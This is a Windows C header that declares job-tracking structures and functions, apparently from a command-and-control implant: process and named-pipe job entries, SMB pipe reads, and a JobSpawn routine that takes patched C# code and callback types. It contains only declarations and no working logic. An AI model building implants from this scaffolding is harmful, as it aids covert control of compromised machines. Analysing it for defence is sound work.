#pragma once
#include <windows.h>

#define JOB_MODE_BYTE       0x0
#define JOB_MODE_MESSAGE    0x1

#define JOB_ENTRY_PROCESS   0x0
#define JOB_ENTRY_NAMEDPIPE 0x1

#define JOB_STATUS_GOOD     0x0
#define JOB_STATUS_DEAD     0x1

typedef struct _JOB_ENTRY
{
	int id;
	HANDLE process;
	HANDLE thread;
	__int64 pid;
	HANDLE hRead;
	HANDLE hWrite;
	struct _JOB_ENTRY* next;
	SHORT isPipe;
	SHORT isDead;
	int pid32;
	DWORD callbackType;
	BOOL isMsgMode;
	char description[64];
} JOB_ENTRY;

// ÏÈÉùÃ÷
extern JOB_ENTRY* gJobs;

JOB_ENTRY* JobRegisterProcess(PROCESS_INFORMATION* pi, HANDLE hRead, HANDLE hWrite, unsigned char* description);
JOB_ENTRY* JobAdd(JOB_ENTRY* newJob);
void JobCleanup();
JOB_ENTRY* JobRegisterProcess(PROCESS_INFORMATION* pi, HANDLE hRead, HANDLE hWrite, unsigned char* description);
DWORD JobReadDataFromPipe(HANDLE hPipe, unsigned char* buffer, int size);
DWORD JobReadDataFromPipeWithHeader(HANDLE hPipe, unsigned char* buffer, int size);
int ProtocolSmbPipeRead(HANDLE channel, unsigned char* buffer, int length);
void ProcessJobEntry(int max);
VOID JobSpawn(WORD callbackType, WORD waitTime, DWORD offset, unsigned char* patchCSharp, DWORD patchCSharpSize, unsigned char* argument, DWORD arguLength, unsigned char* description, DWORD descLength);





